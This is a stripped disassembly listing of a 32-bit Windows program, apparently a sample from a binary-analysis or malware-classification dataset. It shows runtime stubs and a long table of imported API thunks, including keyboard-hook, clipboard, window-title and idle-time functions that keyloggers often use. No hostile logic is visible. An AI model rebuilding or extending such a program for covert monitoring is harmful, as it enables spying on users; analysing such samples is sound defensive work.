sub_4024ea
jmp sub_403988
sub_402789
jmp sub_403988
sub_40284c
call sub_406168
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_406168
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4028a0
mov [ rw-data ] edx
call sub_403f6c
sub_402904
push eax
push edx
push ecx
call sub_406168
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_4028f8
retn
sub_402920
retn
sub_402974
retn
sub_402978
push ebx
call sub_406168
mov ebx [ eax + 0x4 ]
call sub_406168
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_4029e4
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_4029f4
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402a90
mov edx [ eax + 0x1c ]
call sub_402a48
retn
sub_402b23
retn
sub_402b24
xor ecx ecx
mov cl [ edx ]
inc ecx
xchg edx eax
call sub_402998
retn
sub_402d34
mov ecx 0xff
call sub_402d40
retn
sub_402d64
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402d80
jmp sub_402d80
sub_402d7d
retn
sub_40310d
jmp sub_403988
sub_403160
fninit
fwait
fldcw [ rw-data ]
retn
sub_4031c0
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4031cc
push ebx
mov ebx eax
mov eax ebx
call sub_4031fc
call sub_40279c
mov edx eax
mov eax ebx
call sub_403240
pop ebx
retn
sub_4031e8
push ebx
mov ebx eax
mov eax ebx
call sub_403298
mov eax ebx
call sub_4027bc
pop ebx
retn
sub_4031fc
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403224
call sub_4035c0
test dl dl
jle r-xdata
retn
call sub_4035a8
sub_4032e4
retn
sub_40336c
jmp sub_403988
sub_403373
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403484
retn
sub_403488
retn
sub_40348c
retn
sub_403581
jmp sub_4036d4
sub_403586
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_4039e8
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4035a8
sub_4035a8
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4035b0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4035c0
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4035d0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_403698
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4036b4
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403a81
retn
sub_403bc4
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403c52
jmp sub_4036d4
sub_403cb2
jmp sub_4036d4
sub_403ccc
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403bc4
mov [ rw-data ] 0x0
call sub_403c6c
retn
sub_403e05
retn
sub_403f67
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403f6c
mov [ rw-data ] eax
call sub_403e94
sub_404000
push eax
call ExitThread
sub_40422c
retn
sub_404268
retn
sub_404276
retn
sub_40428f
retn
sub_4042a0
retn
sub_404387
retn
j_sub_4044d4
jmp sub_4044d4
sub_40451d
retn
sub_404525
retn
sub_404567
retn
sub_4046ec
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028f8
sub_404704
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call sub_4013c4
sub_40485c
retn
sub_40486e
retn
sub_404a64
mov ecx 0x1
jmp sub_4049d0
sub_404a6e
retn
sub_404aa4
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_4028f8
call [ rw-data ]
retn
sub_404ba8
mov ecx 0x1
jmp sub_404abc
sub_404bb2
retn
sub_404bb4
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_4028f8
call [ rw-data ]
retn
sub_404dda
retn
sub_404ddc
push edx
call sub_40279c
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_404a64
pop eax
sub_404df0
push eax
call sub_404ba8
pop eax
call sub_4027bc
retn
sub_404e00
xchg ecx eax
xchg edx ecx
call sub_404164
retn
sub_404e54
mov al 0x11
jmp sub_4028f8
sub_404e7f
retn
sub_4050c0
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404ce8
pop ebp
retn 0x4
j_sub_404abc
jmp sub_404abc
sub_4050d5
retn
sub_4050d8
call sub_40538c
retn
sub_405418
call sub_4053f0
retn
sub_405761
jmp sub_403988
sub_4058cc
call sub_4058dc
retn
sub_4058d4
call sub_4058fc
retn
sub_4058dc
push ebx
mov ebx eax
mov eax 0x8
call sub_40279c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405997
jmp sub_4036d4
sub_4059b8
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_405a2c
jmp sub_403988
sub_405a33
pop ecx
pop ebp
retn
sub_405aac
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405ab8
add eax 0x4
push eax
call sub_4013d4
retn
sub_405ac4
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_4028f8
sub_405ad4
call sub_4031cc
mov [ eax + 0x4 ] 0x1
retn
sub_405b0c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_4013cc
pop ebp
retn 0x4
sub_405dfb
jmp sub_403988
sub_405e02
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405e9f
jmp sub_403988
sub_405ea6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405eef
jmp sub_403988
sub_405ef6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405fba
jmp sub_403988
sub_405fc1
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_406012
jmp sub_403988
sub_406019
pop ebp
retn
sub_4060f0
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_406110
push eax
push 0x40
call LocalAlloc
retn
sub_40611c
mov eax 0x10
retn
sub_4061a8
mov eax rw-data
call sub_4059b8
retn
sub_40621d
jmp sub_403988
sub_406224
pop ebp
retn
sub_406228
sub [ rw-data ] 0x1
retn
sub_406230
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_40624c
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_406295
jmp sub_403988
sub_40629c
pop ebp
retn
sub_4062a0
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ __import_lookup_table_5(advapi32:RegCloseKey) ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedDecrement
jmp [ __import_lookup_table_6(kernel32:InterlockedDecrement) ]
InterlockedExchange
jmp [ __import_lookup_table_6(kernel32:InterlockedExchange) ]
InterlockedIncrement
jmp [ __import_lookup_table_6(kernel32:InterlockedIncrement) ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetComputerNameA
jmp [ GetComputerNameA@IAT ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ __import_lookup_table_6(kernel32:GetDateFormatA) ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetExitCodeThread
jmp [ __import_lookup_table_6(kernel32:GetExitCodeThread) ]
GetFileSize
jmp [ __import_lookup_table_6(kernel32:GetFileSize) ]
GetFullPathNameA
jmp [ __import_lookup_table_6(kernel32:GetFullPathNameA) ]
GetLocalTime
jmp [ __import_lookup_table_6(kernel32:GetLocalTime) ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
GetUserDefaultLCID
jmp [ GetUserDefaultLCID@IAT ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ GlobalLock@IAT ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalSize
jmp [ __import_lookup_table_6(kernel32:GlobalSize) ]
GlobalUnlock
jmp [ __import_lookup_table_6(kernel32:GlobalUnlock) ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
ResumeThread
jmp [ __import_lookup_table_6(kernel32:ResumeThread) ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_40659c
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ __import_lookup_table_6(kernel32:SleepEx) ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualFree
jmp [ VirtualFree@IAT ]
VirtualProtectEx
jmp [ VirtualProtectEx@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
lstrcpyA
jmp [ __import_lookup_table_6(kernel32:lstrcpyA) ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CloseEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:CloseEnhMetaFile) ]
CopyEnhMetaFileA
jmp [ __import_lookup_table_8(gdi32:CopyEnhMetaFileA) ]
CreateBitmap
jmp [ __import_lookup_table_8(gdi32:CreateBitmap) ]
CreateBrushIndirect
jmp [ __import_lookup_table_8(gdi32:CreateBrushIndirect) ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateEnhMetaFileA
jmp [ __import_lookup_table_8(gdi32:CreateEnhMetaFileA) ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LPtoDP
jmp [ LPtoDP@IAT ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
Polyline
jmp [ __import_lookup_table_8(gdi32:Polyline) ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
Rectangle
jmp [ Rectangle@IAT ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetMapMode
jmp [ __import_lookup_table_8(gdi32:SetMapMode) ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ __import_lookup_table_9(user32:ActivateKeyboardLayout) ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ __import_lookup_table_9(user32:BeginDeferWindowPos) ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
BringWindowToTop
jmp [ BringWindowToTop@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharLowerBuffA
jmp [ __import_lookup_table_9(user32:CharLowerBuffA) ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefMDIChildProcA
jmp [ __import_lookup_table_9(user32:DefMDIChildProcA) ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DeferWindowPos
jmp [ __import_lookup_table_9(user32:DeferWindowPos) ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFocusRect
jmp [ __import_lookup_table_9(user32:DrawFocusRect) ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EnableScrollBar
jmp [ __import_lookup_table_9(user32:EnableScrollBar) ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ __import_lookup_table_9(user32:EndDeferWindowPos) ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetClipboardData
jmp [ GetClipboardData@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetCursorPos
jmp [ __import_lookup_table_9(user32:GetCursorPos) ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ __import_lookup_table_9(user32:GetIconInfo) ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetLastInputInfo
jmp [ GetLastInputInfo@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
GetMessageTime
jmp [ __import_lookup_table_9(user32:GetMessageTime) ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetScrollPos
jmp [ __import_lookup_table_9(user32:GetScrollPos) ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ GetSystemMenu@IAT ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ __import_lookup_table_9(user32:LoadStringA) ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
MsgWaitForMultipleObjects
jmp [ __import_lookup_table_9(user32:MsgWaitForMultipleObjects) ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ __import_lookup_table_9(user32:ReleaseCapture) ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetScrollPos
jmp [ SetScrollPos@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ __import_lookup_table_9(user32:SetWindowTextA) ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
ShowScrollBar
jmp [ __import_lookup_table_9(user32:ShowScrollBar) ]
TrackPopupMenu
jmp [ __import_lookup_table_9(user32:TrackPopupMenu) ]
TranslateMDISysAccel
jmp [ __import_lookup_table_9(user32:TranslateMDISysAccel) ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406d80
call GetTickCount
retn
sub_406d88
xor eax eax
retn
sub_406d8c
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406d9c
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406db8
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406dcc
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406e04
call sub_406d74
retn
sub_406e0c
call sub_406d74
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_406fe9
jmp sub_403988
sub_406ff0
pop ebp
retn
sub_406ff4
sub [ rw-data ] 0x1
retn
sub_407021
jmp sub_403988
sub_407028
pop ebp
retn
sub_40702c
sub [ rw-data ] 0x1
retn
sub_407369
jmp sub_403988
sub_407370
pop ebp
retn
sub_407374
sub [ rw-data ] 0x1
retn
sub_407e31
add eax 0xffffffd4
jmp sub_40d4bc
sub_407e39
add eax 0xffffffd4
jmp sub_40d364
sub_407e41
add eax 0xffffffd4
jmp sub_40d400
sub_407e49
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405ae4
sub_407e53
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405b0c
sub_407f34
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
pop ebx
retn
sub_40820c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4081d4
test eax eax
sete al
pop esi
pop ebx
retn
sub_408744
call sub_408720
retn
sub_4087dc
push eax
call CloseHandle
retn
sub_4089ac
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_4089c0
push esi
mov esi eax
xchg edx eax
call sub_402998
mov eax esi
pop esi
retn
sub_408b80
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_40279c
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408b94
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408bcc
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4027bc
sub_408c34
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_4028f8
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408c58
push ebx
mov ebx eax
mov eax ebx
call sub_404008
pop ebx
retn
sub_408fbb
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_404008
pop eax
pop ebx
retn
sub_409273
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_4093ce
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40972b
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_40972b
sub_409824
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044c8
mov edx esi
xor ecx ecx
call sub_409674
pop esi
pop ebx
retn
sub_409898
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044c8
mov edx esi
mov cl 0x1
call sub_409674
pop esi
pop ebx
retn
sub_409f82
jmp sub_403988
sub_409f89
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a07a
jmp sub_403988
sub_40a081
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a825
jmp sub_403988
sub_40a82c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a8b4
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a858
pop ebp
retn 0x8
sub_40a9f9
jmp sub_403988
sub_40aa00
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40aea3
jmp sub_403988
sub_40aeaa
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b3c3
jmp sub_403988
sub_40b3ca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b475
jmp sub_403988
sub_40b47c
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b51f
jmp sub_403988
sub_40b526
pop esi
pop ecx
pop ebp
retn
sub_40b702
jmp sub_403988
sub_40b709
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b760
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b9bc
mov eax [ rw-data ]
call sub_4039c0
retn
sub_40ba5e
jmp sub_403988
sub_40bb2c
jmp sub_403988
sub_40bb9c
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_4031e8
sub_40bc98
pop ebx
retn
sub_40bd38
jmp sub_403988
sub_40bd3f
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bd48
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4039c0
sub_40bd55
retn
sub_40bd58
push ebp
mov ebp esp
call sub_40bc9c
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40bd48
pop ebp
retn 0x4
sub_40bd74
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
retn
sub_40be0c
push ebx
mov ebx eax
mov eax ebx
call sub_40bd8c
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bfdf
jmp sub_403988
sub_40bfe6
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c0ab
jmp sub_403988
sub_40c0b2
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c0bc
call sub_40b8f4
mov eax 0x1
call sub_403f6c
sub_40c240
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c319
jmp sub_403988
sub_40c336
jmp sub_403988
sub_40c33d
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c3e8
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c34c
mov ecx eax
